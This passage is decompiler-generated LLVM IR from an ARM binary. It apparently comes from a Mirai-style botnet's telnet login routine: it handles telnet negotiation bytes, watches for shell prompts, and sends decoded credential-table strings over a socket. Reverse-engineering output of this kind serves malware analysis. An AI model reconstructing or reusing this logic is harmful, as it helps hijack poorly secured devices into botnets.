  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f28c = add i32 %v0_f28c, 1
  store i32 %v1_f28c, i32* @r7, align 4
  %v1_f290 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f2a0 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f2a0, i32* %r0.global-to-local, align 4
  %v3_f2a4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f2a4, i32* %r2.global-to-local, align 4
  store i32 %v3_f2a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2b0 = load i32, i32* @r6, align 4
  %v1_f2b0 = add i32 %v0_f2b0, 4
  %v2_f2b0 = inttoptr i32 %v1_f2b0 to i32*
  %v3_f2b0 = load i32, i32* %v2_f2b0, align 4
  store i32 %v3_f2b0, i32* %r0.global-to-local, align 4
  %v4_f2b4 = call i32 @__libc_send(i32 %v3_f2b0, i32 %v3_f2a0, i32 %v3_f2a4, i32 16384)
  store i32 %v4_f2b4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f2c4 = load i32, i32* @r6, align 4
  %v1_f2c4 = add i32 %v0_f2c4, 4
  %v2_f2c4 = inttoptr i32 %v1_f2c4 to i32*
  %v3_f2c4 = load i32, i32* %v2_f2c4, align 4
  store i32 %v3_f2c4, i32* %r0.global-to-local, align 4
  %v4_f2c8 = call i32 @__libc_send(i32 %v3_f2c4, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f2d0 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f2d0, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f2d8 = load i32, i32* @r6, align 4
  %v2_f2d8 = add i32 %v1_f2d8, 12
  %v3_f2d8 = inttoptr i32 %v2_f2d8 to i32*
  store i32 9, i32* %v3_f2d8, align 4
  br label %dec_label_pc_f110

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_eff4
  %v1_f2e0 = add i32 %v0_eff4, 24
  %v2_f2e0 = inttoptr i32 %v1_f2e0 to i32*
  %v3_f2e0 = load i32, i32* %v2_f2e0, align 4
  store i32 %v3_f2e0, i32* %r1.global-to-local, align 4
  %v0_f2e4 = load i32, i32* @sb, align 4
  store i32 %v0_f2e4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f2ec166 = icmp eq i32 %v3_f2e0, 0
  store i1 %v3_f2ec166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f2ec166, i1* %cpsr_z.global-to-local, align 1
  %v6_f2f0173 = icmp sgt i32 %v3_f2e0, 0
  br i1 %v6_f2f0173, label %dec_label_pc_f2f4.preheader, label %dec_label_pc_f3a0

dec_label_pc_f2ec.loopexit:                       ; preds = %dec_label_pc_f310
  %v2_f318 = add i32 %v1_f318, 2
  store i32 %v2_f318, i32* @r4, align 4
  %v2_f31c = add i32 %v1_f31c, 2
  store i32 %v2_f31c, i32* @r7, align 4
  %v3_f2ec = icmp uge i32 %v2_f31c, %v1_f2ec
  store i1 %v3_f2ec, i1* %cpsr_c.global-to-local, align 1
  %v9_f2ec = icmp eq i32 %v2_f31c, %v1_f2ec
  store i1 %v9_f2ec, i1* %cpsr_z.global-to-local, align 1
  %v6_f2f0 = icmp slt i32 %v2_f31c, %v1_f2ec
  br i1 %v6_f2f0, label %dec_label_pc_f2f4.preheader, label %dec_label_pc_f3a0

dec_label_pc_f2f4.preheader:                      ; preds = %dec_label_pc_f2e0, %dec_label_pc_f2ec.loopexit
  %v6_f3a8273 = phi i32 [ %v6_f3a8274, %dec_label_pc_f2ec.loopexit ], [ %v0_eff4, %dec_label_pc_f2e0 ]
  %v1_f31c262 = phi i32 [ %v2_f31c, %dec_label_pc_f2ec.loopexit ], [ 0, %dec_label_pc_f2e0 ]
  %v1_f300260 = phi i32 [ %v1_f2ec, %dec_label_pc_f2ec.loopexit ], [ %v3_f2e0, %dec_label_pc_f2e0 ]
  %v0_f2f4258 = phi i32 [ %v2_f318, %dec_label_pc_f2ec.loopexit ], [ %v0_f2e4, %dec_label_pc_f2e0 ]
  br label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2f4.preheader, %dec_label_pc_f384
  %v6_f3a8274 = phi i32 [ %v6_f3a8273, %dec_label_pc_f2f4.preheader ], [ %v0_f38c, %dec_label_pc_f384 ]
  %v1_f31c = phi i32 [ %v1_f31c262, %dec_label_pc_f2f4.preheader ], [ %v1_f390, %dec_label_pc_f384 ]
  %v1_f2ec = phi i32 [ %v1_f300260, %dec_label_pc_f2f4.preheader ], [ %v3_f38c, %dec_label_pc_f384 ]
  %v1_f318 = phi i32 [ %v0_f2f4258, %dec_label_pc_f2f4.preheader ], [ %v1_f398, %dec_label_pc_f384 ]
  %v1_f2f4 = inttoptr i32 %v1_f318 to i8*
  %v2_f2f4 = load i8, i8* %v1_f2f4, align 1
  %v3_f2f4 = zext i8 %v2_f2f4 to i32
  store i32 %v3_f2f4, i32* @r3, align 4
  %v2_f2f8 = icmp eq i8 %v2_f2f4, -1
  store i1 %v2_f2f8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2f8, label %dec_label_pc_f300, label %dec_label_pc_f3a0

dec_label_pc_f300:                                ; preds = %dec_label_pc_f2f4
  %v0_f300 = load i32, i32* @sb, align 4
  %v2_f300 = add i32 %v0_f300, %v1_f2ec
  store i32 %v2_f300, i32* %r2.global-to-local, align 4
  %v1_f304 = add i32 %v1_f318, 1
  store i32 %v1_f304, i32* @r5, align 4
  %v3_f308 = icmp uge i32 %v2_f300, %v1_f304
  store i1 %v3_f308, i1* %cpsr_c.global-to-local, align 1
  %v9_f308 = icmp eq i32 %v2_f300, %v1_f304
  store i1 %v9_f308, i1* %cpsr_z.global-to-local, align 1
  %v2_f30c = xor i1 %v3_f308, true
  %v3_f30c = or i1 %v9_f308, %v2_f30c
  br i1 %v3_f30c, label %dec_label_pc_f3a0, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f300
  %v2_f310 = inttoptr i32 %v1_f304 to i8*
  %v3_f310 = load i8, i8* %v2_f310, align 1
  %v4_f310 = zext i8 %v3_f310 to i32
  store i32 %v4_f310, i32* @r3, align 4
  %v2_f314 = icmp eq i8 %v3_f310, -1
  store i1 %v2_f314, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f314, label %dec_label_pc_f2ec.loopexit, label %dec_label_pc_f324

dec_label_pc_f324:                                ; preds = %dec_label_pc_f310
  %v2_f324 = icmp ugt i8 %v3_f310, -4
  store i1 %v2_f324, i1* %cpsr_c.global-to-local, align 1
  %v7_f324 = icmp eq i8 %v3_f310, -3
  store i1 %v7_f324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f324, label %dec_label_pc_f8b8, label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f324
  %v1_f32c = add i32 %v1_f318, 2
  store i32 %v1_f32c, i32* @r3, align 4
  %v3_f330 = icmp uge i32 %v2_f300, %v1_f32c
  store i1 %v3_f330, i1* %cpsr_c.global-to-local, align 1
  %v9_f330 = icmp eq i32 %v2_f300, %v1_f32c
  store i1 %v9_f330, i1* %cpsr_z.global-to-local, align 1
  %v2_f334 = xor i1 %v3_f330, true
  %v3_f334 = or i1 %v9_f330, %v2_f334
  br i1 %v3_f334, label %dec_label_pc_f3a0, label %dec_label_pc_f338

dec_label_pc_f338:                                ; preds = %dec_label_pc_f91c, %bb454, %.thread138, %dec_label_pc_f32c
  %v0_f338 = load i32, i32* @r5, align 4
  %v1_f338 = inttoptr i32 %v0_f338 to i8*
  %v2_f338 = load i8, i8* %v1_f338, align 1
  %v3_f338 = zext i8 %v2_f338 to i32
  store i32 %v3_f338, i32* %r3.global-to-local, align 4
  %v2_f33c = icmp ugt i8 %v2_f338, -4
  store i1 %v2_f33c, i1* %cpsr_c.global-to-local, align 1
  %v7_f33c = icmp eq i8 %v2_f338, -3
  store i1 %v7_f33c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f33c, label %.thread96, label %dec_label_pc_f34c

.thread96:                                        ; preds = %dec_label_pc_f338
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f338, align 1
  %v0_f348.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f348.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f34cthread-pre-split_crit_edge

.thread96.dec_label_pc_f34cthread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f34c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f34c

dec_label_pc_f34c:                                ; preds = %dec_label_pc_f338, %.thread96.dec_label_pc_f34cthread-pre-split_crit_edge
  %v0_f34c.pr = phi i32 [ %v0_f34c.pr.pre, %.thread96.dec_label_pc_f34cthread-pre-split_crit_edge ], [ %v3_f338, %dec_label_pc_f338 ]
  %v2_f34c = icmp ugt i32 %v0_f34c.pr, 250
  store i1 %v2_f34c, i1* %cpsr_c.global-to-local, align 1
  %v7_f34c = icmp eq i32 %v0_f34c.pr, 251
  store i1 %v7_f34c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f34c, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f34c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f354 = load i32, i32* @r5, align 4
  %v4_f354 = inttoptr i32 %v3_f354 to i8*
  store i8 -3, i8* %v4_f354, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f34c, %.thread96, %bb433
  %v0_f358 = load i32, i32* @r4, align 4
  %v1_f358 = add i32 %v0_f358, 2
  %v2_f358 = inttoptr i32 %v1_f358 to i8*
  %v3_f358 = load i8, i8* %v2_f358, align 1
  %v4_f358 = zext i8 %v3_f358 to i32
  store i32 %v4_f358, i32* %r3.global-to-local, align 4
  %v2_f35c = icmp ugt i8 %v3_f358, -4
  store i1 %v2_f35c, i1* %cpsr_c.global-to-local, align 1
  %v7_f35c = icmp eq i8 %v3_f358, -3
  store i1 %v7_f35c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f35c, label %.thread100, label %dec_label_pc_f36c

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f358, align 1
  %v0_f368.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f368.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f36cthread-pre-split_crit_edge

.thread100.dec_label_pc_f36cthread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f36c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %.thread99, %.thread100.dec_label_pc_f36cthread-pre-split_crit_edge
  %v0_f36c.pr = phi i32 [ %v0_f36c.pr.pre, %.thread100.dec_label_pc_f36cthread-pre-split_crit_edge ], [ %v4_f358, %.thread99 ]
  %v2_f36c = icmp ugt i32 %v0_f36c.pr, 250
  store i1 %v2_f36c, i1* %cpsr_c.global-to-local, align 1
  %v7_f36c = icmp eq i32 %v0_f36c.pr, 251
  store i1 %v7_f36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f36c, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f36c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f374 = load i32, i32* @r4, align 4
  %v4_f374 = add i32 %v3_f374, 2
  %v5_f374 = inttoptr i32 %v4_f374 to i8*
  store i8 -3, i8* %v5_f374, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f36c, %.thread100, %bb434
  %v0_f378 = load i32, i32* @r6, align 4
  %v1_f378 = add i32 %v0_f378, 4
  %v2_f378 = inttoptr i32 %v1_f378 to i32*
  %v3_f378 = load i32, i32* %v2_f378, align 4
  store i32 %v3_f378, i32* %r0.global-to-local, align 4
  %v0_f37c = load i32, i32* @r4, align 4
  br label %dec_label_pc_f384

dec_label_pc_f384:                                ; preds = %dec_label_pc_fa30, %.thread103
  %v0_f388 = phi i32 [ %v3_fa44, %dec_label_pc_fa30 ], [ %v3_f378, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f8d0, %dec_label_pc_fa30 ], [ %v0_f37c, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_fa30 ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f388 = call i32 @__libc_send(i32 %v0_f388, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f388, i32* %r0.global-to-local, align 4
  %v0_f38c = load i32, i32* @r6, align 4
  %v1_f38c = add i32 %v0_f38c, 24
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  store i32 %v3_f38c, i32* %r1.global-to-local, align 4
  %v0_f390 = load i32, i32* @r7, align 4
  %v1_f390 = add i32 %v0_f390, 3
  store i32 %v1_f390, i32* @r7, align 4
  %v3_f394 = icmp uge i32 %v1_f390, %v3_f38c
  store i1 %v3_f394, i1* %cpsr_c.global-to-local, align 1
  %v9_f394 = icmp eq i32 %v1_f390, %v3_f38c
  store i1 %v9_f394, i1* %cpsr_z.global-to-local, align 1
  %v0_f398 = load i32, i32* @r4, align 4
  %v1_f398 = add i32 %v0_f398, 3
  store i32 %v1_f398, i32* @r4, align 4
  %v5_f39c = icmp slt i32 %v1_f390, %v3_f38c
  br i1 %v5_f39c, label %dec_label_pc_f2f4, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f2ec.loopexit, %dec_label_pc_f2f4, %dec_label_pc_f384, %dec_label_pc_f32c, %dec_label_pc_f300, %dec_label_pc_f2e0, %dec_label_pc_f8b8.dec_label_pc_f3a0.loopexit_crit_edge
  %v6_f3a8 = phi i32 [ %v0_f8e8, %dec_label_pc_f8b8.dec_label_pc_f3a0.loopexit_crit_edge ], [ %v0_eff4, %dec_label_pc_f2e0 ], [ %v6_f3a8274, %dec_label_pc_f2f4 ], [ %v0_f38c, %dec_label_pc_f384 ], [ %v6_f3a8274, %dec_label_pc_f32c ], [ %v6_f3a8274, %dec_label_pc_f300 ], [ %v6_f3a8274, %dec_label_pc_f2ec.loopexit ]
  %v0_f3a0 = phi i32 [ %v0_f3a0.pre.pre, %dec_label_pc_f8b8.dec_label_pc_f3a0.loopexit_crit_edge ], [ 0, %dec_label_pc_f2e0 ], [ %v1_f31c, %dec_label_pc_f2f4 ], [ %v1_f390, %dec_label_pc_f384 ], [ %v1_f31c, %dec_label_pc_f32c ], [ %v1_f31c, %dec_label_pc_f300 ], [ %v2_f31c, %dec_label_pc_f2ec.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3a0 = icmp eq i32 %v0_f3a0, 0
  store i1 %v2_f3a0, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f3a0, 1
  br i1 %tmp435, label %dec_label_pc_f78c, label %bb436

bb436:                                            ; preds = %dec_label_pc_f3a0
  store i32 3, i32* @r3, align 4
  %v7_f3a8 = add i32 %v6_f3a8, 12
  %v8_f3a8 = inttoptr i32 %v7_f3a8 to i32*
  store i32 3, i32* %v8_f3a8, align 4
  br label %dec_label_pc_f78c

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_eff4
  %v1_f3b0 = add i32 %v0_eff4, 24
  %v2_f3b0 = inttoptr i32 %v1_f3b0 to i32*
  %v3_f3b0 = load i32, i32* %v2_f3b0, align 4
  store i32 %v3_f3b0, i32* %r2.global-to-local, align 4
  %v1_f3b4 = add i32 %v3_f3b0, -1
  store i32 %v1_f3b4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3b8 = icmp eq i32 %v1_f3b4, 0
  store i1 %v2_f3b8, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f3b4, 1
  br i1 %tmp437, label %dec_label_pc_ef78.backedge.thread, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f3b0
  %v2_f3c0 = add i32 %v1_f3b4, %v0_eff4
  store i32 %v2_f3c0, i32* %r3.global-to-local, align 4
  %v1_f3c4 = add i32 %v2_f3c0, 28
  %v2_f3c4 = inttoptr i32 %v1_f3c4 to i8*
  %v3_f3c4 = load i8, i8* %v2_f3c4, align 1
  %v4_f3c4 = zext i8 %v3_f3c4 to i32
  store i32 %v4_f3c4, i32* %r3.global-to-local, align 4
  %v2_f3c8 = icmp ugt i8 %v3_f3c4, 61
  store i1 %v2_f3c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c8 = icmp eq i8 %v3_f3c4, 62
  store i1 %v7_f3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3c8, label %dec_label_pc_f42c, label %bb438

bb438:                                            ; preds = %dec_label_pc_f3c0
  %v3_f3cc = icmp ugt i8 %v3_f3c4, 57
  store i1 %v3_f3cc, i1* %cpsr_c.global-to-local, align 1
  %v8_f3cc = icmp eq i8 %v3_f3c4, 58
  store i1 %v8_f3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3cc, label %dec_label_pc_f42c, label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %bb438
  %v2_f3d4 = icmp ugt i8 %v3_f3c4, 35
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d4 = icmp eq i8 %v3_f3c4, 36
  store i1 %v7_f3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d4, label %dec_label_pc_f42c, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3d4
  %v2_f3dc = icmp ugt i8 %v3_f3c4, 34
  store i1 %v2_f3dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3dc = icmp eq i8 %v3_f3c4, 35
  store i1 %v7_f3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3dc, label %dec_label_pc_f42c, label %dec_label_pc_f3e4

dec_label_pc_f3e4:                                ; preds = %dec_label_pc_f3dc
  %v2_f3e4 = icmp ugt i8 %v3_f3c4, 36
  store i1 %v2_f3e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e4 = icmp eq i8 %v3_f3c4, 37
  store i1 %v7_f3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3e4, label %dec_label_pc_f42c, label %dec_label_pc_f414.preheader

dec_label_pc_f414.preheader:                      ; preds = %dec_label_pc_f3e4
  %v3_f3e8 = add i32 %v0_eff4, 28
  %v2_f3ec = add i32 %v3_f3e8, %v3_f3b0
  store i32 %v2_f3ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f414

dec_label_pc_f3f8:                                ; preds = %bb439
  %v2_f3f8 = icmp ugt i8 %v3_f41c, 35
  store i1 %v2_f3f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3f8 = icmp eq i8 %v3_f41c, 36
  store i1 %v7_f3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3f8, label %dec_label_pc_f42c, label %dec_label_pc_f400

dec_label_pc_f400:                                ; preds = %dec_label_pc_f3f8
  %v2_f400 = icmp ugt i8 %v3_f41c, 34
  store i1 %v2_f400, i1* %cpsr_c.global-to-local, align 1
  %v7_f400 = icmp eq i8 %v3_f41c, 35
  store i1 %v7_f400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f400, label %dec_label_pc_f42c, label %dec_label_pc_f408

dec_label_pc_f408:                                ; preds = %dec_label_pc_f400
  %v2_f408 = icmp ugt i8 %v3_f41c, 36
  store i1 %v2_f408, i1* %cpsr_c.global-to-local, align 1
  %v7_f408 = icmp eq i8 %v3_f41c, 37
  store i1 %v7_f408, i1* %cpsr_z.global-to-local, align 1
  %v1_f40c = add i32 %v0_f40c, -1
  store i32 %v1_f40c, i32* %r3.global-to-local, align 4
  br i1 %v7_f408, label %dec_label_pc_f42c, label %dec_label_pc_f414

dec_label_pc_f414:                                ; preds = %dec_label_pc_f414.preheader, %dec_label_pc_f408
  %v0_f40c = phi i32 [ %v2_f3ec, %dec_label_pc_f414.preheader ], [ %v1_f40c, %dec_label_pc_f408 ]
  %v0_f414 = phi i32 [ %v1_f3b4, %dec_label_pc_f414.preheader ], [ %v1_f414, %dec_label_pc_f408 ]
  %v1_f414 = add i32 %v0_f414, -1
  store i32 %v1_f414, i32* %r1.global-to-local, align 4
  %v2_f414 = icmp ne i32 %v0_f414, 0
  store i1 %v2_f414, i1* %cpsr_c.global-to-local, align 1
  %v7_f414 = icmp eq i32 %v0_f414, 1
  store i1 %v7_f414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f414, label %dec_label_pc_ef78.backedge.thread561, label %dec_label_pc_f41c

dec_label_pc_f41c:                                ; preds = %dec_label_pc_f414
  %v1_f41c = add i32 %v0_f40c, -2
  %v2_f41c = inttoptr i32 %v1_f41c to i8*
  %v3_f41c = load i8, i8* %v2_f41c, align 1
  %v4_f41c = zext i8 %v3_f41c to i32
  store i32 %v4_f41c, i32* %r2.global-to-local, align 4
  %v2_f420 = icmp ugt i8 %v3_f41c, 61
  store i1 %v2_f420, i1* %cpsr_c.global-to-local, align 1
  %v7_f420 = icmp eq i8 %v3_f41c, 62
  store i1 %v7_f420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f420, label %dec_label_pc_f42c, label %bb439

bb439:                                            ; preds = %dec_label_pc_f41c
  %v3_f424 = icmp ugt i8 %v3_f41c, 57
  store i1 %v3_f424, i1* %cpsr_c.global-to-local, align 1
  %v8_f424 = icmp eq i8 %v3_f41c, 58
  store i1 %v8_f424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f424, label %dec_label_pc_f42c, label %dec_label_pc_f3f8

dec_label_pc_f42c:                                ; preds = %dec_label_pc_f41c, %bb439, %dec_label_pc_f408, %dec_label_pc_f400, %dec_label_pc_f3f8, %dec_label_pc_f3e4, %dec_label_pc_f3c0, %dec_label_pc_f3dc, %dec_label_pc_f3d4, %bb438
  %v0_f430 = phi i32 [ %v1_f3b4, %dec_label_pc_f3e4 ], [ %v1_f3b4, %dec_label_pc_f3c0 ], [ %v1_f3b4, %dec_label_pc_f3dc ], [ %v1_f3b4, %dec_label_pc_f3d4 ], [ %v1_f3b4, %bb438 ], [ %v1_f414, %dec_label_pc_f3f8 ], [ %v1_f414, %dec_label_pc_f400 ], [ %v1_f414, %dec_label_pc_f408 ], [ %v1_f414, %bb439 ], [ %v1_f414, %dec_label_pc_f41c ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f430 = add i32 %v0_f430, 1
  store i32 %v1_f430, i32* @r7, align 4
  %v1_f434 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f444 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f444, i32* %r0.global-to-local, align 4
  %v3_f448 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f448, i32* %r2.global-to-local, align 4
  store i32 %v3_f444, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f454 = load i32, i32* @r6, align 4
  %v1_f454 = add i32 %v0_f454, 4
  %v2_f454 = inttoptr i32 %v1_f454 to i32*
  %v3_f454 = load i32, i32* %v2_f454, align 4
  store i32 %v3_f454, i32* %r0.global-to-local, align 4
  %v4_f458 = call i32 @__libc_send(i32 %v3_f454, i32 %v3_f444, i32 %v3_f448, i32 16384)
  store i32 %v4_f458, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f468 = load i32, i32* @r6, align 4
  %v1_f468 = add i32 %v0_f468, 4
  %v2_f468 = inttoptr i32 %v1_f468 to i32*
  %v3_f468 = load i32, i32* %v2_f468, align 4
  store i32 %v3_f468, i32* %r0.global-to-local, align 4
  %v4_f46c = call i32 @__libc_send(i32 %v3_f468, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f474 = call i32 @table_lock_val(i32 8)
  store i32 %v1_f474, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f47c = load i32, i32* @r6, align 4
  %v2_f47c = add i32 %v1_f47c, 12
  %v3_f47c = inttoptr i32 %v2_f47c to i32*
  store i32 7, i32* %v3_f47c, align 4
  br label %dec_label_pc_f110

dec_label_pc_f484:                                ; preds = %dec_label_pc_eff4
  %v1_f484 = add i32 %v0_eff4, 24
  %v2_f484 = inttoptr i32 %v1_f484 to i32*
  %v3_f484 = load i32, i32* %v2_f484, align 4
  store i32 %v3_f484, i32* %r2.global-to-local, align 4
  %v1_f488 = add i32 %v3_f484, -1
  store i32 %v1_f488, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f48c = icmp eq i32 %v1_f488, 0
  store i1 %v2_f48c, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f488, 1
  br i1 %tmp440, label %dec_label_pc_ef78.backedge.thread, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f484
  %v2_f494 = add i32 %v1_f488, %v0_eff4
  store i32 %v2_f494, i32* %r3.global-to-local, align 4
  %v1_f498 = add i32 %v2_f494, 28
  %v2_f498 = inttoptr i32 %v1_f498 to i8*
  %v3_f498 = load i8, i8* %v2_f498, align 1
  %v4_f498 = zext i8 %v3_f498 to i32
  store i32 %v4_f498, i32* %r3.global-to-local, align 4
  %v2_f49c = icmp ugt i8 %v3_f498, 61
  store i1 %v2_f49c, i1* %cpsr_c.global-to-local, align 1
  %v7_f49c = icmp eq i8 %v3_f498, 62
  store i1 %v7_f49c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f49c, label %dec_label_pc_f500, label %bb441

bb441:                                            ; preds = %dec_label_pc_f494
  %v3_f4a0 = icmp ugt i8 %v3_f498, 57
  store i1 %v3_f4a0, i1* %cpsr_c.global-to-local, align 1
  %v8_f4a0 = icmp eq i8 %v3_f498, 58
  store i1 %v8_f4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4a0, label %dec_label_pc_f500, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %bb441
  %v2_f4a8 = icmp ugt i8 %v3_f498, 35
  store i1 %v2_f4a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a8 = icmp eq i8 %v3_f498, 36
  store i1 %v7_f4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4a8, label %dec_label_pc_f500, label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f4a8
  %v2_f4b0 = icmp ugt i8 %v3_f498, 34
  store i1 %v2_f4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b0 = icmp eq i8 %v3_f498, 35
  store i1 %v7_f4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b0, label %dec_label_pc_f500, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f4b0
  %v2_f4b8 = icmp ugt i8 %v3_f498, 36
  store i1 %v2_f4b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b8 = icmp eq i8 %v3_f498, 37
  store i1 %v7_f4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b8, label %dec_label_pc_f500, label %dec_label_pc_f4e8.preheader

dec_label_pc_f4e8.preheader:                      ; preds = %dec_label_pc_f4b8
  %v3_f4bc = add i32 %v0_eff4, 28
  %v2_f4c0 = add i32 %v3_f4bc, %v3_f484
  store i32 %v2_f4c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f4e8

dec_label_pc_f4cc:                                ; preds = %bb442
  %v2_f4cc = icmp ugt i8 %v3_f4f0, 35
  store i1 %v2_f4cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4cc = icmp eq i8 %v3_f4f0, 36
  store i1 %v7_f4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4cc, label %dec_label_pc_f500, label %dec_label_pc_f4d4

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f4cc
  %v2_f4d4 = icmp ugt i8 %v3_f4f0, 34
  store i1 %v2_f4d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d4 = icmp eq i8 %v3_f4f0, 35
  store i1 %v7_f4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d4, label %dec_label_pc_f500, label %dec_label_pc_f4dc

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f4d4
  %v2_f4dc = icmp ugt i8 %v3_f4f0, 36
